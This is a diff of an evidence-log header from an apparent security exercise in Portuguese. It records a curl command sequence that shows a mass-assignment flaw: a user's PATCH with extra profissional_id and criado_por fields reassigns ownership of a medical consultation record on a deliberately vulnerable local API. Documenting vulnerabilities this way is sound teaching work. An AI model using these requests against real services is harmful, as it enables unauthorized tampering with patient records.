@@ -1,6 +1,5 @@
 # Evidência : V4 Mass assignment (ANTES): Carla altera a PRÓPRIA consulta enviando profissional_id e criado_por extras → aceitos; a consulta troca de dono
 # Exercício : ex09
-# Data      : 2026-09-28 09:36:07 -0400
 # Commit    : 104f916 (ex08-vulneravel)
 # Comando   : TC=$(scripts/token.sh dra_carla); CID=$(curl -s -X POST localhost:8000/consultas -H "Authorization: Bearer $TC" -H 'content-type: application/json' -d '{"paciente_id":1,"data_hora":"2026-09-28T16:00:00","observacoes":"minha"}' | consultas-api/.venv/bin/python -c 'import sys,json;print(json.load(sys.stdin)["id"])'); echo "consulta $CID criada por Carla (profissional_id=1)"; echo '--- PATCH com campos extras profissional_id=2 e criado_por=hacker:'; curl -s -X PATCH localhost:8000/consultas/$CID -H "Authorization: Bearer $TC" -H 'content-type: application/json' -d '{"observacoes":"editada","profissional_id":2,"criado_por":"hacker"}'; echo; echo '--- resultado (profissional_id virou 2):'; curl -s localhost:8000/consultas/$CID/prontuario -H "Authorization: Bearer $TC"
 # ------------------------------------------------------------------
